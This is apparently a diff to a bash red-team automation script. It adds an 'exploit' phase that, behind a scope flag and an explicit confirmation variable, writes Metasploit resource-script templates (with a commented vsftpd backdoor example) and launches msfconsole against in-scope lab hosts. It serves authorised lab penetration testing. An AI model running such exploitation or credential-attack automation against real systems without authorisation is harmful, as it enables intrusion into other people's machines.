@@ -11,6 +11,8 @@
 #   ./redteam.sh web              # dirb + nikto on in-scope hosts
 #   ./redteam.sh vuln             # searchsploit + safe NSE
 #   ./redteam.sh creds            # hydra (only if allow_credential_testing: true)
+#   ./redteam.sh exploit          # Metasploit (only if allow_exploitation: true
+#                                 #   AND CONFIRM_EXPLOIT=yes) — not part of 'all'
 #   ./redteam.sh report           # compile REPORT.md + findings.csv
 #   ./redteam.sh all              # recon -> web -> vuln -> (creds) -> report
 #   ./redteam.sh scope            # print parsed scope and exit
@@ -124,7 +126,55 @@ phase_vuln() {
     run_or_print nmap "nmap -sV --script 'default,safe,vuln' $TIMING -oA '$d/nse' $t"
     echo "    [then: searchsploit <product> <version> for each service found above]"
   done
-  [ "$ALLOW_EXPLOIT" = "true" ] && info "NOTE: allow_exploitation is true — exploitation is still manual/operator-confirmed; this runner never launches exploits."
+  [ "$ALLOW_EXPLOIT" = "true" ] && info "NOTE: allow_exploitation is true — run './redteam.sh exploit' (gated) to launch Metasploit modules against lab targets."
+}
+
+phase_exploit() {
+  info "=== exploitation (Metasploit) ==="
+  # Triple gate: scope flag + explicit confirmation + RFC1918 (enforced globally).
+  if [ "$ALLOW_EXPLOIT" != "true" ]; then
+    info "allow_exploitation is not true — skipping. Set it in $SCOPE_FILE to enable."; return
+  fi
+  if [ "${CONFIRM_EXPLOIT:-}" != "yes" ]; then
+    echo "    Exploitation launches real attacks against the in-scope LAB hosts: ${IN_SCOPE[*]}"
+    echo "    These must be machines you own in an isolated lab. To proceed, re-run with:"
+    echo "        CONFIRM_EXPLOIT=yes ./redteam.sh exploit"
+    return
+  fi
+  info "exploitation CONFIRMED for: ${IN_SCOPE[*]}"
+  for t in "${IN_SCOPE[@]}"; do
+    [[ "$t" == */* ]] && { info "skip CIDR $t for exploitation — target individual hosts"; continue; }
+    in_out_scope "$t" && { info "skip out-of-scope $t"; continue; }
+    local d; d="$(host_dir "$t")"; mkdir -p "$d"
+    local rc="$d/exploit.rc"
+    if [ ! -f "$rc" ]; then
+      # Emit a template resource script the operator fills from the vuln-assessor
+      # mapping (one module per host). We never pick/launch a module on our own.
+      cat > "$rc" <<RC
+# Metasploit resource script for $t — fill in the module and options, then rerun.
+# Derive the module from reports/${t//\//_}/nse + searchsploit (vuln-assessor output).
+# Example (Metasploitable2 vsftpd backdoor):
+#   use exploit/unix/ftp/vsftpd_234_backdoor
+#   set RHOSTS $t
+#   run
+# -- edit below --
+# use <exploit/module/path>
+# set RHOSTS $t
+# set LHOST <your-kali-ip>
+# run
+# exit -y
+RC
+      echo "    wrote template $rc — add the module (from vuln assessment), then rerun this phase."
+      continue
+    fi
+    # Refuse to run a template that still has no active 'use' line.
+    if ! grep -qE '^[[:space:]]*use[[:space:]]' "$rc"; then
+      echo "    $rc has no 'use <module>' line yet — fill it in before running."
+      continue
+    fi
+    run_or_print msfconsole "msfconsole -q -r '$rc' | tee '$d/exploit_output.txt'"
+  done
+  info "Review exploit output per host; capture what detection/logging it would (or did) trigger — that's the prevention lesson."
 }
 
 phase_creds() {
@@ -185,8 +235,9 @@ case "${1:-}" in
   web)    phase_web ;;
   vuln)   phase_vuln ;;
   creds)  phase_creds ;;
+  exploit) phase_exploit ;;
   report) phase_report ;;
   scope)  print_scope ;;
   all)    phase_recon; phase_web; phase_vuln; phase_creds; phase_report ;;
-  *) echo "usage: $0 {recon|web|vuln|creds|report|all|scope}"; exit 2 ;;
+  *) echo "usage: $0 {recon|web|vuln|creds|exploit|report|all|scope}"; exit 2 ;;
 esac
